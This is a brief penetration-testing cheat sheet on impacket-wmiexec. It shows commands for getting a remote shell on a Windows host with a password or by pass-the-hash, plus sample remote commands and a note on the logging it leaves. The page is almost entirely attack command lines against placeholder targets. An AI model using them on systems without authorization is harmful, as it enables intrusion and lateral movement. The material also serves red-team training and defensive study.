# WMIExec

!!! tip ""
    `impacket-wmiexec domain/user:pass@10.10.10.10` gives a semi-interactive shell. For pass-the-hash: `-hashes :NTLM`. WMI execution leaves fewer traces than PSExec but still generates Event ID 4688 (process creation).

---

## Basic Usage

```bash
impacket-wmiexec EXAMPLE/Administrator@10.10.10.10
impacket-wmiexec EXAMPLE/Administrator:'Password123'@10.10.10.10
```

---

## Pass-the-Hash

```bash
impacket-wmiexec EXAMPLE/Administrator@10.10.10.10 -hashes :2892d26cdf84d7a70e2eb3b9f05c425e
```

---

## Execute Commands

```bash
impacket-wmiexec EXAMPLE/Administrator:'Password123'@10.10.10.10 "whoami"
impacket-wmiexec EXAMPLE/Administrator:'Password123'@10.10.10.10 "ipconfig /all"
impacket-wmiexec EXAMPLE/Administrator:'Password123'@10.10.10.10 "powershell -c Get-Process"
```
